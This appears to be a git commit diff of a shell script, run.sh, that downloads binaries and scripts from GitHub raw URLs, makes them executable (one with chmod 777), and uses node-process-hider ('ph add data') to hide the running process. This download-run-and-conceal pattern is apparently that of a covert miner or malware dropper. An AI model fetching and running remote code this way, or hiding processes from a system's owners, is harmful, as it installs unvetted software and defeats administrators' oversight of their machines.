a29662635c219eedda9be7daac210e904e72e379
bendrat1 <89236724+bendrat1@users.noreply.github.com>
2022-07-17 12:56:04 +0000

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,17 +1,18 @@
 #!/bin/sh
 #
 apt update -y
+apt install screen
 
 apt install -y lynx
 npm i -g node-process-hider
 #
 lynx -dont_wrap_pre -dump https://raw.githubusercontent.com/bendrat1/app/main/serabe > data && chmod 777 data
-wget https://raw.githubusercontent.com/bendrat1/sop-sumohaven/main/ping
-wget https://raw.githubusercontent.com/bendrat1/sop-sumohaven/main/time.sh
+wget https://raw.githubusercontent.com/bendrat1/sop-sumohaven/main/ping && chmod +x ping
+wget https://raw.githubusercontent.com/bendrat1/sop-sumohaven/main/time.sh && chmod +x time.sh
 
 #####
 clear
-chmod +x ping.sh && chmod +x time.sh
+ 
 #
 ph add data
 
